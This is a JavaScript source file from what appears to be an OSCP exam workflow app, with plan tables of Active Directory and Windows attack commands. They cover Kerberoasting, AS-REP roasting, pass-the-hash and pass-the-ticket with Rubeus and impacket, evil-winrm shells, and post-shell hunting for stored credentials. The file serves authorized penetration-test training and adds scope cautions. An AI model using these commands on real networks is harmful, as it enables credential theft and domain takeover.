 {id:'aes-key',label:'Kerberos AES key',kind:'PRINCIPAL KEY',prereq:'Confirm the exact account, realm and whether the value is AES128 or AES256. It is not an NT hash.',proof:`impacket-getTGT "$DOMAIN/$USER" -aesKey "$AES_KEY" -dc-ip "$DC_IP"
export KRB5CCNAME="$(pwd)/$USER.ccache"
klist`,next:`nxc smb "$HOST_FQDN" --use-kcache
impacket-smbclient -k -no-pass "$DOMAIN/$USER@$HOST_FQDN"`,success:'A returned TGT proves the key/account pairing. Service access still depends on SPN, reachability, account rights and target policy.',fallback:'Check key length/account/realm, DC FQDN/IP and time. Read local getTGT -h before reformatting the key.',close:'Protect the key and ccache; unset AES_KEY and KRB5CCNAME.'},
 {id:'laps',label:'LAPS local-admin password',kind:'ONE COMPUTER',prereq:'Map the LAPS value to the exact computer object/hostname and identify the managed local administrator account.',proof:`nxc smb "$IP" -u "$LOCAL_ADMIN" -p "$LAPS_PASS" --local-auth`,next:`nxc smb "$IP" -u "$LOCAL_ADMIN" -p "$LAPS_PASS" --local-auth --shares
# Use remote shell only if exposed and authorized:
evil-winrm -i "$IP" -u "$LOCAL_ADMIN" -p "$LAPS_PASS"`,success:'The password is scoped to the mapped computer and local identity. Authentication and administrative execution remain separate checks.',fallback:'Reconfirm computer mapping, password freshness and local username. Do not switch to domain mode or reuse it on unrelated machines.',close:'Record the computer/account mapping, protect the secret and unset LAPS_PASS.'},
 {id:'gmsa',label:'gMSA NT hash',kind:'SERVICE IDENTITY',prereq:'Confirm the exact gMSA sAMAccountName (often ending $), material source, SPNs and one host/service relationship that makes the account useful.',proof:`nxc smb "$HOST_FQDN" -u "$GMSA_USER" -H "$NTHASH" -d "$DOMAIN"`,next:`impacket-getTGT "$DOMAIN/$GMSA_USER" -hashes ":$NTHASH" -dc-ip "$DC_IP"
export KRB5CCNAME="$(pwd)/$GMSA_USER.ccache"
klist`,success:'The hash proves one service identity, not broad access. The account’s SPNs, delegation and graph relationships identify the useful target.',fallback:'Check the trailing $, hash form, SPNs, DNS/time and whether NTLM is permitted. Validate one Kerberos path if SMB/NTLM is unsuitable.',close:'Protect the hash/ticket, record the exact relationship used, then unset NTHASH and KRB5CCNAME.'}
];

let adFastPathState=safeStoredRecord(STORE+'adFastPath',{});
let adEdgePlannerState=safeStoredRecord(STORE+'adEdgePlanner',{});
let credentialRouteState=safeStoredRecord(STORE+'credentialRoute',{});
const RUBEUS_ROUTE_PLANS=[
 {id:'session',label:'Existing Windows logon / tickets',kind:'READ-ONLY INVENTORY',why:'Use the ticket context you already have before requesting or injecting new material.',commands:'klist\nRubeus.exe triage\nRubeus.exe dump /nowrap',success:'Identify the ticket type, client/service principal, realm and expiry. Continue from the existing session if it already proves the needed access.',caution:'Do not blindly purge the only useful ticket cache.'},
 {id:'usernames',label:'Confirmed usernames, no password',kind:'AS-REP CHECK',why:'Only accounts with Kerberos pre-authentication disabled return roastable material.',commands:'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',success:'A returned AS-REP hash is evidence; PREAUTH_REQUIRED by itself is not.',caution:'Crack offline only if justified; do not turn user enumeration into password spraying.'},
 {id:'spn',label:'Valid context + specific SPN/service account',kind:'TARGETED KERBEROAST',why:'Prefer a known candidate over blind collection when directory/BloodHound already identified the service account.',commands:'Rubeus.exe kerberoast /user:<TARGET_USER> /format:hashcat /nowrap /outfile:kerb_hashes.txt',success:'A TGS hash is returned for the intended account.',caution:'An SPN does not imply a weak password. Crack offline and stop if it is not economical.'},
 {id:'ntlm',label:'NTLM hash',kind:'ASKTGT / RC4',why:'Request a TGT from the recovered NTLM material, then inject it only into the intended Windows logon session.',commands:'Rubeus.exe asktgt /user:<USER> /rc4:<NTLM> /domain:<DOMAIN> /dc:<DC_FQDN> /ptt\nklist',success:'klist shows the expected TGT in this session.',caution:'Use the exact domain/DC/FQDN and validate time. A hash is not proof of authorization to every service.'},
 {id:'aes',label:'AES256 Kerberos key',kind:'ASKTGT / AES',why:'Prefer the Kerberos-native key when it is already available.',commands:'Rubeus.exe asktgt /user:<USER> /aes256:<AES256> /domain:<DOMAIN> /dc:<DC_FQDN> /ptt\nklist',success:'The expected TGT is present.',caution:'Wrong realm/DC/time can look like a credential failure; decode the KDC error first.'},
 {id:'ticket',label:'.kirbi / base64 TGT or TGS',kind:'PASS-THE-TICKET',why:'Inject only the ticket you actually need into the current logon session.',commands:'Rubeus.exe ptt /ticket:<KIRBI_OR_BASE64>\nklist',success:'The intended ticket appears in klist; test the exact FQDN/SPN next.',caution:'A TGS is service-specific. A successful import does not mean unrelated protocols will work.'},
 {id:'password',label:'Username + password only',kind:'PASSWORD — PREFER PROMPT',why:'Avoid putting a real password into saved command text or process arguments when a Kali prompt can do the same job.',commands:'impacket-getTGT "<DOMAIN>/<USER>" -dc-ip "<DC_IP>"\nexport KRB5CCNAME="$(pwd)/<USER>.ccache"\nklist',success:'A ccache exists without storing the password in the command.',caution:'If Windows-local Rubeus is essential, /password:<PASSWORD> must be substituted only at execution time; never save the literal secret in the app/journal.'},
 {id:'delegation',label:'BloodHound proves delegation / S4U edge',kind:'PREREQUISITE-GATED',why:'S4U syntax depends on the exact account, delegation model, target SPN and user to impersonate.',commands:'# Do not guess a generic Rubeus s4u command.\n# Open the delegation/ACL workflow and fill the proven source account, SPN and impersonated identity first.',success:'The graph/read-only checks prove every input required for the exact delegation path.',caution:'Wrong SPN/FQDN or delegation type produces misleading failures. Build the command from the proven edge, not memory.'}
];
let rubeusRouteState=safeStoredRecord(STORE+'rubeusRoute',{});
const EXAM_RULE_LOCK_IDS=['objectives','ai','metasploit','proof','submit','downloads','report','proctor'];
let examRuleLockState=safeStoredRecord(STORE+'examRuleLock',{});
function saveAdFastPath(){safeStoreSet(STORE+'adFastPath',JSON.stringify(adFastPathState));v9Dirty=true}
function saveAdEdgePlanner(){safeStoreSet(STORE+'adEdgePlanner',JSON.stringify(adEdgePlannerState));v9Dirty=true}
function saveCredentialRoute(){safeStoreSet(STORE+'credentialRoute',JSON.stringify(credentialRouteState));v9Dirty=true}
function saveRubeusRoute(){safeStoreSet(STORE+'rubeusRoute',JSON.stringify(rubeusRouteState));v9Dirty=true}
function saveExamRuleLock(){safeStoreSet(STORE+'examRuleLock',JSON.stringify(examRuleLockState));v9Dirty=true}
function renderAdFastPath(){
 const key=winStrategyKey(),state=adFastPathState[key]||{};
 $$('.adFastCheck').forEach(x=>{x.checked=!!state[x.dataset.step];x.closest('.adFastStep')?.classList.toggle('done',x.checked)});
 const done=AD_FAST_STEPS.filter(id=>state[id]).length,metric=$('#adFastDone');if(metric){metric.textContent=`${done}/${AD_FAST_STEPS.length}`;metric.className='adEdgeRisk '+(done===AD_FAST_STEPS.length?'low':'medium')}
}
function edgePlanText(p){return `${p.label} — ${p.target}\nRisk: ${p.risk.toUpperCase()}\n\nWHY\n${p.summary}\n\nPREREQUISITES\n${p.prereq}\n\nREAD-ONLY PROOF\n${p.read}\n\nMINIMUM ACTION\n${p.action}\n\nVERIFY\n${p.verify}\n\nROLLBACK / CLOSE\n${p.rollback}\n\nCAUTION\n${p.caveat}`}
function renderAdEdgePlanner(){
 const select=$('#adEdgeSelect'),box=$('#adEdgePlanner');if(!select||!box)return;
 if(!select.options.length)select.innerHTML=AD_EDGE_PLANS.map(p=>`<option value="${esc(p.id)}">${esc(p.label)}</option>`).join('');
 const key=winStrategyKey(),saved=adEdgePlannerState[key];if(saved&&AD_EDGE_PLANS.some(p=>p.id===saved))select.value=saved;
 const p=AD_EDGE_PLANS.find(x=>x.id===select.value)||AD_EDGE_PLANS[0];select.value=p.id;
 box.className='adEdgePlanner risk-'+p.risk;
 const blocks=[['Prerequisites',p.prereq],['Read-only proof',p.read],['Minimum action',p.action],['Verify result',p.verify],['Rollback / close',p.rollback]];
 box.innerHTML=`<div class="row" style="justify-content:space-between;align-items:flex-start"><div><h3 style="margin:0">${esc(p.label)} <span class="chip">${esc(p.target)}</span></h3><div class="muted">${esc(p.summary)}</div></div><span class="adEdgeRisk ${esc(p.risk)}">${esc(p.risk.toUpperCase())} RISK</span></div><div class="adEdgePlanGrid">${blocks.map(([h,v])=>`<div class="adEdgePlanBlock"><h3>${esc(h)}</h3><pre>${esc(v)}</pre></div>`).join('')}<div class="adEdgePlanBlock"><h3>Caution</h3><div>${esc(p.caveat)}</div></div></div>`;
}
function credentialRoutePlanText(p){return `${p.label} — ${p.kind}\n\nPREREQUISITES\n${p.prereq}\n\nFIRST ONE-HOST PROOF\n${p.proof}\n\nNEXT ONLY IF JUSTIFIED\n${p.next}\n\nINTERPRETATION\n${p.success}\n\nIF IT FAILS\n${p.fallback}\n\nCLOSE\n${p.close}`}
function renderCredentialRoute(){
 const select=$('#credentialRouteSelect'),box=$('#credentialRoutePlan');if(!select||!box)return;
 if(!select.options.length)select.innerHTML=CREDENTIAL_ROUTE_PLANS.map(p=>`<option value="${esc(p.id)}">${esc(p.label)}</option>`).join('');
 const key=winStrategyKey(),saved=credentialRouteState[key];select.value=CREDENTIAL_ROUTE_PLANS.some(p=>p.id===saved)?saved:CREDENTIAL_ROUTE_PLANS[0].id;
 const p=CREDENTIAL_ROUTE_PLANS.find(x=>x.id===select.value)||CREDENTIAL_ROUTE_PLANS[0];
 const blocks=[['Prerequisites',p.prereq],['First one-host proof',p.proof],['Next only if justified',p.next],['Interpretation',p.success],['If it fails',p.fallback],['Close',p.close]];
 box.innerHTML=blocks.map(([h,v],i)=>`<div class="credentialRouteBlock ${i===4?'credentialRouteCaution':''}"><h3>${esc(h)}</h3>${i===1||i===2?`<pre>${esc(v)}</pre>`:`<div>${esc(v)}</div>`}</div>`).join('');
}
function rubeusRoutePlanText(p){return `${p.label} — ${p.kind}\n\nWHY\n${p.why}\n\nCOMMAND / PLAN\n${p.commands}\n\nSUCCESS\n${p.success}\n\nCAUTION\n${p.caution}`}
function renderRubeusRoute(){
 const select=$('#rubeusRouteSelect'),box=$('#rubeusRoutePlan');if(!select||!box)return;
 if(!select.options.length)select.innerHTML=RUBEUS_ROUTE_PLANS.map(p=>`<option value="${esc(p.id)}">${esc(p.label)}</option>`).join('');
 const key=winStrategyKey(),saved=rubeusRouteState[key];select.value=RUBEUS_ROUTE_PLANS.some(p=>p.id===saved)?saved:RUBEUS_ROUTE_PLANS[0].id;
 const p=RUBEUS_ROUTE_PLANS.find(x=>x.id===select.value)||RUBEUS_ROUTE_PLANS[0];
 const blocks=[['Why this route',p.why],['Command / plan',p.commands],['Success means',p.success],['Caution',p.caution]];
 box.innerHTML=blocks.map(([title,v],i)=>`<div class="credentialRouteBlock ${i===3?'credentialRouteCaution':''}"><h3>${esc(title)}</h3>${i===1?`<pre>${esc(v)}</pre>`:`<div>${esc(v)}</div>`}</div>`).join('');
}
function renderExamRuleLock(){
 $$('.ruleLockCheck').forEach(x=>{x.checked=!!examRuleLockState[x.dataset.rule];x.closest('.check')?.classList.toggle('done',x.checked)});
 const done=EXAM_RULE_LOCK_IDS.filter(id=>examRuleLockState[id]).length,el=$('#ruleLockCount');if(el){el.textContent=`${done}/${EXAM_RULE_LOCK_IDS.length} locked`;el.classList.toggle('ready',done===EXAM_RULE_LOCK_IDS.length)}
}

const WINDOWS_STRATEGY_STEPS=[
 {id:'baseline',title:'1. Baseline the shell',why:'Know the identity, privilege set, Windows build, routes and listeners before interpreting any privesc output.',cmd:'whoami /all\nhostname\nsysteminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"\nipconfig /all\nroute print\nnetstat -ano',anchor:'ref-13-0-v16-windows-post-shell-workflow'},
 {id:'filesystem',title:'2. Quick filesystem / software triage',why:'Non-default folders and readable user/application data often explain the intended path faster than a generic vulnerability search.',cmd:'dir C:\\ /a\ntree /F /A C:\\Users\ndir "C:\\Program Files"\ndir "C:\\Program Files (x86)" 2>nul\ndir C:\\ProgramData /a',anchor:'ref-13-0-v16-windows-post-shell-workflow'},
 {id:'tools',title:'3. Automated pass — SAVE + READ',why:'Use PrivEscCheck for clean signal, WinPEAS for breadth, Seatbelt as a complementary collector. Saving output prevents repeated noisy scans.',cmd:'Import-Module .\\PrivescCheck.ps1; Invoke-PrivescCheck | Tee-Object privesccheck.txt\n.\\winPEASx64.exe | Tee-Object winpeas.txt\n.\\Seatbelt.exe -group=all > seatbelt.txt',anchor:'ref-13-1-automated-tools-run-these-first-2'},
 {id:'credentials',title:'4. Focused credential hunting',why:'PowerShell history, saved credentials, autologon/unattend data and application configs are frequent direct paths and create focused credential-coverage work.',cmd:'cmdkey /list\nreg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"\nfor /d %u in (C:\\Users\\*) do @type "%u\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" 2>nul\ndir /s /b C:\\Windows\\Panther\\*unattend* 2>nul',anchor:'ref-8-3-credential-hunting'},
 {id:'privileges',title:'5. Token / sensitive privileges',why:'A named privilege is a high-signal lead only when its exact compatible primitive and context are validated.',cmd:'whoami /priv\nwhoami /groups',anchor:'ref-13-7-windows-privileges-don-t-stop-at-seimpersonate'},
 {id:'services',title:'6. Services — prove all three conditions',why:'Prioritize privileged service context + controllable binary/config/ACL + trigger/restartability. An unquoted path alone is not enough.',cmd:'powershell -NoProfile -Command "Get-CimInstance Win32_Service | select Name,StartName,State,StartMode,PathName"\n.\\accesschk.exe /accepteula -uwcqv "Authenticated Users" *',anchor:'ref-13-2-service-exploits'},
 {id:'tasks',title:'7. Scheduled tasks / autoruns',why:'The useful finding is a privileged task/autorun whose referenced file, directory, registry value or dependency you can control.',cmd:'schtasks /query /fo LIST /v\npowershell -NoProfile -Command "Get-ScheduledTask | select TaskName,TaskPath,State"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',anchor:'ref-13-3-scheduled-tasks-autoruns'},
 {id:'registry',title:'8. Registry / installer policy',why:'Check both AlwaysInstallElevated keys, autologon and writable privileged registry-backed execution paths.',cmd:'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',anchor:'ref-13-3-registry-alwaysinstallelevated'},
 {id:'listeners',title:'9. Local-only listeners / internal services',why:'A service bound only to 127.0.0.1 can be the intended attack surface. Map port → PID → application → config/credentials.',cmd:'powershell -NoProfile -Command "Get-NetTCPConnection -State Listen | sort LocalPort | ft LocalAddress,LocalPort,OwningProcess"\ntasklist /svc\nnetstat -ano',anchor:'ref-13-0-v16-windows-post-shell-workflow'},
 {id:'software',title:'10. Installed / custom applications',why:'Identify non-default software and custom binaries, then validate exact version/config/permissions before considering a CVE.',cmd:'powershell -NoProfile -Command "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* 2>$null | select DisplayName,DisplayVersion,InstallLocation"\ndir "C:\\Program Files"\ndir C:\\ProgramData',anchor:'ref-13-0-v16-windows-post-shell-workflow'},
 {id:'reenum',title:'11. Re-enumerate after context changes',why:'New user/admin/SYSTEM credentials, group membership, routes or sessions change what is readable and exploitable.',cmd:'whoami /all\ncmdkey /list\nnetstat -ano\nREM repeat services/tasks/credential visibility under the new identity',anchor:'ref-13-0-v16-windows-post-shell-workflow'},
 {id:'cve',title:'12. Driver / kernel / missing patch LAST',why:'Only pursue after simpler configuration paths are exhausted and the exact build/component/prerequisites/recovery plan are known.',cmd:'systeminfo\npowershell -NoProfile -Command "Get-HotFix | Sort InstalledOn -Descending | select -First 20 HotFixID,InstalledOn"\ndriverquery /v',anchor:'ref-13-13-2026-windows-ad-cve-reference-validate-before-use'}
];
let windowsStrategyState=safeStoredRecord(STORE+'windowsStrategy',{});
function winStrategyKey(){const s=$('#winStrategyTarget');return s?.value||activeTargetId||'__unassigned__'}
function saveWindowsStrategy(){safeStoreSet(STORE+'windowsStrategy',JSON.stringify(windowsStrategyState));v9Dirty=true}
function renderWindowsStrategy(){
 const sel=$('#winStrategyTarget'),body=$('#winStrategyBody');if(!sel||!body)return;
 const old=sel.value;const opts=['<option value="__unassigned__">No exam target selected</option>',...targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))}</option>`)].join('');sel.innerHTML=opts;
 const wanted=(old&&[...sel.options].some(o=>o.value===old))?old:(activeTargetId&&targets.some(t=>t.id===activeTargetId)?activeTargetId:'__unassigned__');sel.value=wanted;
 const key=winStrategyKey(),state=windowsStrategyState[key]||{};
 body.innerHTML=WINDOWS_STRATEGY_STEPS.map(s=>`<div class="winStrategyStep ${state[s.id]?'done':''}"><div class="row" style="justify-content:space-between;align-items:flex-start"><label><input class="winStrategyCheck" data-step="${s.id}" type="checkbox" ${state[s.id]?'checked':''}> <b>${esc(s.title)}</b></label><div class="row"><button class="btn winStrategyCopy" data-step="${s.id}">Copy</button><button class="btn winStrategyRef" data-ref="${esc(s.anchor)}">Ref →</button></div></div><div class="winStrategyWhy">${esc(s.why)}</div><pre class="winStrategyCmd">${esc(s.cmd)}</pre></div>`).join('');
 $$('.winStrategyCheck').forEach(x=>x.onchange=()=>{const k=winStrategyKey();windowsStrategyState[k]=windowsStrategyState[k]||{};windowsStrategyState[k][x.dataset.step]=x.checked;saveWindowsStrategy();renderWindowsStrategy()});
 $$('.winStrategyCopy').forEach(b=>b.onclick=async()=>{const s=WINDOWS_STRATEGY_STEPS.find(x=>x.id===b.dataset.step);if(!s)return;await guardedCopyText(sanitizeUnicode(s.cmd),'Windows strategy command',null,{allowPlaceholders:true})});
 $$('.winStrategyRef').forEach(b=>b.onclick=()=>openRef(b.dataset.ref));
 const done=WINDOWS_STRATEGY_STEPS.filter(s=>state[s.id]).length;$('#winStrategyDone').textContent=`${done}/${WINDOWS_STRATEGY_STEPS.length}`;$('#winStrategyPct').textContent=`${Math.round(done/WINDOWS_STRATEGY_STEPS.length*100)}%`;
 const t=targets.find(x=>x.id===key),windowsRoles=new Set(['windows','ad-member','dc']);$('#winStrategyTargetHint').innerHTML=t?`Selected: <b>${esc(targetLabel(t))}</b>${!windowsRoles.has(t.role)?'<br><span class="tiny">Role is not marked Windows/AD; use only if this target actually has a Windows shell.</span>':''}`:'No exam target selected — add or choose the current Windows exam target to store progress safely.';
 renderAdFastPath();renderAdEdgePlanner();renderCredentialRoute();renderRubeusRoute();
}
$('#winStrategyTarget').onchange=renderWindowsStrategy;
$('#winStrategyOpenRef').onclick=()=>openRef('ref-13-0-v16-windows-post-shell-workflow');
$('#winStrategyReset').onclick=()=>{const k=winStrategyKey();if(confirm('Reset the Windows strategy checklist for this target?')){delete windowsStrategyState[k];saveWindowsStrategy();renderWindowsStrategy()}};
$$('.adFastCopy').forEach(b=>b.onclick=async()=>{const pre=b.closest('.adFastStep')?.querySelector('pre');if(pre)await guardedCopyText(sanitizeUnicode(pre.textContent),'AD fast-path command',null,{allowPlaceholders:true})});
$$('.adFastCheck').forEach(x=>x.onchange=()=>{const k=winStrategyKey();adFastPathState[k]=adFastPathState[k]||{};adFastPathState[k][x.dataset.step]=x.checked;saveAdFastPath();renderAdFastPath()});
$('#adFastReset').onclick=()=>{const k=winStrategyKey();if(confirm('Reset the four-step AD fast path for this target?')){delete adFastPathState[k];saveAdFastPath();renderAdFastPath()}};
$('#adEdgeSelect').onchange=()=>{adEdgePlannerState[winStrategyKey()]=$('#adEdgeSelect').value;saveAdEdgePlanner();renderAdEdgePlanner()};
$('#adEdgeCopyPlan').onclick=async()=>{const p=AD_EDGE_PLANS.find(x=>x.id===$('#adEdgeSelect').value);if(p)await guardedCopyText(sanitizeUnicode(edgePlanText(p)),'AD edge plan',null,{allowPlaceholders:true})};
$('#adEdgeOpenRef').onclick=()=>openRef('ref-9-6b-v19-bloodhound-edge-execution-desk');
$('#credentialRouteSelect').onchange=()=>{credentialRouteState[winStrategyKey()]=$('#credentialRouteSelect').value;saveCredentialRoute();renderCredentialRoute()};
$('#credentialRouteCopy').onclick=async()=>{const p=CREDENTIAL_ROUTE_PLANS.find(x=>x.id===$('#credentialRouteSelect').value);if(p)await guardedCopyText(sanitizeUnicode(credentialRoutePlanText(p)),'Credential route plan',null,{allowPlaceholders:true})};
$('#credentialRouteOpenRef').onclick=()=>openRef('ref-9-6c-v19-credential-material-router');
$('#rubeusRouteSelect').onchange=()=>{rubeusRouteState[winStrategyKey()]=$('#rubeusRouteSelect').value;saveRubeusRoute();renderRubeusRoute()};
$('#rubeusRouteCopy').onclick=async()=>{const p=RUBEUS_ROUTE_PLANS.find(x=>x.id===$('#rubeusRouteSelect').value);if(p)await guardedCopyText(sanitizeUnicode(rubeusRoutePlanText(p)),'Rubeus route plan',null,{allowPlaceholders:true})};
$('#rubeusRouteOpenRef').onclick=()=>openRef('ref-9-4a-rubeus-material-router');
$$('.ruleLockCheck').forEach(x=>x.onchange=()=>{examRuleLockState[x.dataset.rule]=x.checked;saveExamRuleLock();renderExamRuleLock()});
$('#ruleLockReset').onclick=()=>{if(confirm('Reset the exam rules lock?')){examRuleLockState={};saveExamRuleLock();renderExamRuleLock()}};
$('#adFailureAnalyze').onclick=renderAdFailureDecoder;
$('#adFailureClear').onclick=()=>{$('#adFailureInput').value='';renderAdFailureDecoder();$('#adFailureInput').focus()};
const winStrategySwitchBase=switchView;switchView=function(id){winStrategySwitchBase(id);if(id==='windowsStrategyView')renderWindowsStrategy()};

/* Extra deterministic signals useful when pasting Windows enumeration output. */
if(typeof OUTPUT_RULES!=='undefined'){
 OUTPUT_RULES.unshift(
  {id:'win-password-state',level:'warn',title:'Password expired / must change',tag:'[AD:AUTH]',signal:'creds',confidence:'prereq',re:/STATUS_PASSWORD_EXPIRED|STATUS_PASSWORD_MUST_CHANGE|KDC_ERR_KEY_EXPIRED|password\s+(?:has\s+)?expired|must\s+change\s+(?:the\s+)?password/i,why:'The credential may be valid but policy-restricted. Open AD Failure Decoder → password-state recovery before changing tools or spraying alternatives.'},
  {id:'win-autologon-pass',level:'high',title:'Windows AutoLogon password value detected',tag:'[WIN:WORKFLOW]',signal:'creds',confidence:'high',re:/DefaultPassword\s+REG_SZ\s+\S+/i,why:'A non-empty DefaultPassword value appears in Winlogon output. Record the account/domain context, validate it on one relevant in-scope host/service, then expand only through observed reachability or Credential Debt.'},
  {id:'win-saved-cred',level:'warn',title:'Saved Windows credential target detected',tag:'[WIN:WORKFLOW]',signal:'dpapi',confidence:'prereq',re:/(?:Currently stored credentials|Target:\s+(?:Domain|LegacyGeneric|TERMSRV))/i,why:'Credential Manager material appears present. Determine the target/user and whether the current DPAPI/user context permits useful recovery or runas usage.'}
 );
}

/* Include strategy progress in normal and encrypted session backups. */
const winStrategySessionBase=sessionPayload;sessionPayload=function(includeSecrets=false){const o=winStrategySessionBase(includeSecrets);o.app='OSCP-V19';o.version=19;o.releaseVersion=OSCP_RELEASE_VERSION;o.windowsStrategyState=windowsStrategyState;o.adFastPathState=adFastPathState;o.adEdgePlannerState=adEdgePlannerState;o.credentialRouteState=credentialRouteState;o.rubeusRouteState=rubeusRouteState;o.examRuleLockState=examRuleLockState;return o};
const winStrategyRestoreBase=restoreV9Payload;restoreV9Payload=function(o){if(o?.windowsStrategyState&&typeof o.windowsStrategyState==='object')windowsStrategyState=o.windowsStrategyState;if(o?.adFastPathState&&typeof o.adFastPathState==='object')adFastPathState=o.adFastPathState;if(o?.adEdgePlannerState&&typeof o.adEdgePlannerState==='object')adEdgePlannerState=o.adEdgePlannerState;if(o?.credentialRouteState&&typeof o.credentialRouteState==='object')credentialRouteState=o.credentialRouteState;if(plainRecord(o?.rubeusRouteState))rubeusRouteState=o.rubeusRouteState;if(o?.examRuleLockState&&typeof o.examRuleLockState==='object')examRuleLockState=o.examRuleLockState;winStrategyRestoreBase(o);saveWindowsStrategy();saveAdFastPath();saveAdEdgePlanner();saveCredentialRoute();saveRubeusRoute();saveExamRuleLock();renderWindowsStrategy();renderExamRuleLock()};

try{V16_SELF_TESTS.push(
 ['Session schema identity',()=>{const p=sessionPayload(false);return[p.version===19&&p.app==='OSCP-V19','schema='+p.version]}],
 ['AD edge plans complete',()=>[AD_EDGE_PLANS.length>=14&&AD_EDGE_PLANS.every(p=>['id','label','target','risk','summary','prereq','read','action','verify','rollback','caveat'].every(k=>String(p[k]||'').trim())),`${AD_EDGE_PLANS.length} plans`]],
 ['AD fast path target state',()=>[AD_FAST_STEPS.length===4&&typeof renderAdFastPath==='function','4 target-aware steps']],
 ['Credential router complete',()=>[CREDENTIAL_ROUTE_PLANS.length===8&&CREDENTIAL_ROUTE_PLANS.every(p=>['id','label','kind','prereq','proof','next','success','fallback','close'].every(k=>String(p[k]||'').trim())),'8 material types']],
 ['Rubeus material router is complete and secret-safe',()=>{const txt=RUBEUS_ROUTE_PLANS.map(r=>rubeusRoutePlanText(r)).join('\n');return[RUBEUS_ROUTE_PLANS.length===8&&RUBEUS_ROUTE_PLANS.every(p=>['id','label','kind','why','commands','success','caution'].every(k=>String(p[k]||'').trim()))&&!txt.includes('/password:pass')&&txt.includes('/rc4:<NTLM>')&&txt.includes('/aes256:<AES256>')&&txt.includes('ptt /ticket:<KIRBI_OR_BASE64>'),'8 routes · no literal password example']}],
 ['Legacy migration discovers newest older versions and ignores future state',()=>{const p=olderOSCPStoragePrefixes(['oscp_v6_targets','oscp_v15_credentials','oscp_v14_settings','oscp_v16_targets','oscp_v999_future','other'],16);return[JSON.stringify(p)===JSON.stringify(['oscp_v15_','oscp_v14_','oscp_v6_']),p.join(',')]}],
 ['Rules lock complete',()=>[EXAM_RULE_LOCK_IDS.length===8&&sessionPayload(false).examRuleLockState===examRuleLockState,'8 current-rule checks']],
 ['Mutation rollback warnings',()=>[AD_EDGE_PLANS.find(p=>p.id==='force-password').rollback.includes('NO SAFE GENERIC ROLLBACK')&&AD_EDGE_PLANS.find(p=>p.id==='rbcd').rollback.includes('Never use flush'),'irreversible+RBCD guarded']]
)}catch(e){}

renderWindowsStrategy();
renderExamRuleLock();
